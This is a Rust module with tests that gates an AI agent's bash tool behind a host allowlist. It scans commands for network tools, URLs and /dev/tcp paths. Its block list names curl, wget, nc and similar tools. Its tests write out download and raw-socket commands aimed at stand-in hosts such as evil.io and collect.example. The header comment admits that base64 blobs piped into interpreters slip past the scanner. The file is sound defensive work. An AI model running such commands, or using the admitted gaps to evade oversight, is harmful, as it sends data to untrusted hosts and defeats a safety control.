//! The bash egress allowlist: `CRAFT_AGENT_EGRESS_ALLOWLIST` names the
//! hosts a command may talk to, and the bash tool scans the command
//! string for network verbs and http(s) URLs before spawning. It is a
//! conservative token scanner, not a shell parser: whatever it cannot
//! resolve to an allowed host is denied, never passed. An unset or empty
//! knob means no gating. The recommended value is
//! `github.com,api.github.com,codeload.github.com,objects.githubusercontent.com`.
//! Known residuals: heredoc bodies are scanned as data, and base64 blobs
//! piped into interpreters are invisible — a tripwire, not a firewall.

use crate::error::ToolError;

pub const KNOB: &str = "CRAFT_AGENT_EGRESS_ALLOWLIST";

const MAX_KNOB_BYTES: usize = 4096;
const SNIPPET_CAP: usize = 120;
const NETWORK_VERBS: &[&str] = &[
    "curl", "wget", "nc", "ncat", "netcat", "telnet", "ssh", "scp", "sftp",
];
const DEV_HOST_PREFIXES: &[&str] = &["/dev/tcp/", "/dev/udp/"];

/// The allowlist named by the knob, or None when the gate is off. A
/// non-empty knob that names no host denies every network command.
pub fn allowlist(knob: Option<&str>) -> Option<Vec<String>> {
    let value = knob?;
    if value.trim().is_empty() {
        return None;
    }
    if value.len() > MAX_KNOB_BYTES {
        return Some(Vec::new());
    }
    let hosts = value
        .split(',')
        .map(|entry| entry.trim().to_lowercase())
        .filter(|entry| !entry.is_empty())
        .collect();
    Some(hosts)
}

/// Deny `command` if any network verb, http(s) URL, or bash /dev/tcp
/// path resolves to a host outside `allowed`.
pub fn check(command: &str, allowed: &[String]) -> Result<(), ToolError> {
    let tokens = tokenize(command);
    for (idx, token) in tokens.iter().enumerate() {
        if let Some(host) = url_host(&token.text)? {
            require_allowed(&host, allowed)?;
        }
        if let Some(host) = dev_host(&token.text)? {
            require_allowed(&host, allowed)?;
        }
        if NETWORK_VERBS.contains(&token.text.as_str()) {
            let target = verb_target(&tokens, idx)?;
            let host = host_of(&target)?;
            require_allowed(&host, allowed)?;
        }
    }
    Ok(())
}

fn require_allowed(host: &str, allowed: &[String]) -> Result<(), ToolError> {
    if allowed.iter().any(|entry| entry == host) {
        return Ok(());
    }
    Err(ToolError::EgressHostDenied {
        host: host.to_string(),
    })
}

/// The first non-option token after the verb inside its own command
/// segment; a verb with no such token is unresolvable.
fn verb_target(tokens: &[Token], verb_idx: usize) -> Result<String, ToolError> {
    let segment = tokens[verb_idx].segment;
    for token in tokens.iter().skip(verb_idx + 1) {
        if token.segment != segment {
            break;
        }
        if token.text.starts_with('-') {
            continue;
        }
        return Ok(token.text.clone());
    }
    Err(unresolved(&tokens[verb_idx].text))
}

fn unresolved(snippet: &str) -> ToolError {
    ToolError::EgressUnresolved {
        snippet: crate::util::truncate_char_boundary(snippet, SNIPPET_CAP).to_string(),
    }
}

/// One shell word and the command segment it belongs to; `;`, `|`, `&`,
/// `(`, `)`, `<`, `>` start new segments, quotes and backticks are
/// delimiters, and `#` at a word start comments out the rest of the line.
struct Token {
    text: String,
    segment: usize,
}

fn tokenize(command: &str) -> Vec<Token> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut segment = 0usize;
    let mut in_comment = false;
    for c in command.chars() {
        if in_comment {
            if c == '\n' {
                in_comment = false;
            }
            continue;
        }
        if c == '#' && current.is_empty() {
            in_comment = true;
            continue;
        }
        if matches!(c, ';' | '|' | '&' | '(' | ')' | '<' | '>') {
            flush(&mut tokens, &mut current, segment);
            segment += 1;
            continue;
        }
        if c == '\'' || c == '"' || c == '`' || c.is_whitespace() {
            flush(&mut tokens, &mut current, segment);
            continue;
        }
        current.push(c);
    }
    flush(&mut tokens, &mut current, segment);
    tokens
}

fn flush(tokens: &mut Vec<Token>, current: &mut String, segment: usize) {
    if !current.is_empty() {
        tokens.push(Token {
            text: std::mem::take(current),
            segment,
        });
    }
}

/// The host of an http(s) URL token, or None when the token is not one.
fn url_host(token: &str) -> Result<Option<String>, ToolError> {
    let lower = token.to_lowercase();
    let rest = lower
        .strip_prefix("http://")
        .or_else(|| lower.strip_prefix("https://"));
    match rest {
        Some(rest) => Ok(Some(host_after_scheme(rest, token)?)),
        None => Ok(None),
    }
}

/// The host inside a bash /dev/tcp/ or /dev/udp/ word.
fn dev_host(token: &str) -> Result<Option<String>, ToolError> {
    for prefix in DEV_HOST_PREFIXES {
        if let Some(rest) = token.strip_prefix(*prefix) {
            let host = rest.split('/').next().unwrap_or_default();
            if host.is_empty() {
                return Err(unresolved(token));
            }
            return Ok(Some(host.to_lowercase()));
        }
    }
    Ok(None)
}

/// The host inside the post-scheme part of a URL. `rest` arrives
/// lowercased; `raw` names the original token in error snippets.
fn host_after_scheme(rest: &str, raw: &str) -> Result<String, ToolError> {
    let authority = rest.split(['/', '?', '#']).next().unwrap_or_default();
    let host_port = match authority.rsplit_once('@') {
        Some((_, after)) => after,
        None => authority,
    };
    let host = if let Some(rest) = host_port.strip_prefix('[') {
        let Some((literal, _)) = rest.split_once(']') else {
            return Err(unresolved(raw));
        };
        if literal.is_empty() {
            return Err(unresolved(raw));
        }
        format!("[{literal}]")
    } else {
        match host_port.split_once(':') {
            Some((before, _)) => before,
            None => host_port,
        }
        .to_string()
    };
    if host.is_empty() {
        return Err(unresolved(raw));
    }
    Ok(host)
}

/// The host of a verb's target token: a URL, a `user@host` form, a
/// `host:port` or scp-style `host:path` form, or a bare host. A target
/// with an expansion character in it is unresolvable.
fn host_of(raw: &str) -> Result<String, ToolError> {
    if raw.is_empty() || raw.contains('$') || raw.contains('`') {
        return Err(unresolved(raw));
    }
    let lower = raw.to_lowercase();
    if let Some((_, rest)) = lower.split_once("://") {
        return host_after_scheme(rest, raw);
    }
    let word = match lower.split_once('/') {
        Some((before, _)) => before,
        None => lower.as_str(),
    };
    let after_user = match word.rsplit_once('@') {
        Some((_, after)) => after,
        None => word,
    };
    let host = match after_user.split_once(':') {
        Some((before, _)) => before,
        None => after_user,
    };
    if host.is_empty() {
        return Err(unresolved(raw));
    }
    Ok(host.to_string())
}

#[cfg(test)]
mod tests {
    use super::{allowlist, check, host_after_scheme, host_of};

    const ALLOWED: &[&str] = &["github.com", "api.github.com"];

    fn allowed() -> Vec<String> {
        ALLOWED.iter().map(|h| h.to_string()).collect()
    }

    #[test]
    fn url_host_shapes() {
        for (raw, host) in [
            ("api.github.com/repos/o/r", "api.github.com"),
            ("user:pass@github.com/x", "github.com"),
            ("github.com:8443/x", "github.com"),
            ("[::1]:8080/x", "[::1]"),
            ("", ""),
        ] {
            assert_eq!(
                host_after_scheme(raw, raw).unwrap_or_default(),
                host,
                "{raw}"
            );
        }
        assert!(host_after_scheme("", "x").is_err());
    }

    #[test]
    fn verb_target_host_shapes() {
        for (raw, host) in [
            ("https://github.com", "github.com"),
            ("HTTPS://GitHub.Com/X", "github.com"),
            ("git@github.com:owner/repo.git", "github.com"),
            ("github.com:443", "github.com"),
            ("evil.com/path", "evil.com"),
        ] {
            assert_eq!(host_of(raw).unwrap_or_default(), host, "{raw}");
        }
        for raw in ["", "$URL", "`x`", "https://", ":80", "/x"] {
            assert!(host_of(raw).is_err(), "{raw} must be unresolvable");
        }
    }

    #[test]
    fn knob_parsing() {
        assert!(allowlist(None).is_none());
        assert!(allowlist(Some("")).is_none());
        assert!(allowlist(Some("  ")).is_none());
        assert_eq!(
            allowlist(Some(" GitHub.COM , api.github.com ,,")).map(|v| v.len()),
            Some(2)
        );
        assert!(allowlist(Some(",")).is_some_and(|v| v.is_empty()));
    }

    #[test]
    fn scanner_decisions() {
        assert!(check("echo hello", &allowed()).is_ok());
        assert!(check("echo curl https://api.github.com/x", &allowed()).is_ok());
        for denied in [
            "echo https://collect.example/x",
            "wget collect.example/f.tar",
            "telnet collect.example 23",
            "sftp user@collect.example",
            "curl -sSL https://evil.io/x",
            "bash -c 'curl https://collect.example'",
            "exec 3<>/dev/tcp/collect.example/80",
        ] {
            assert!(check(denied, &allowed()).is_err(), "{denied}");
        }
    }
}
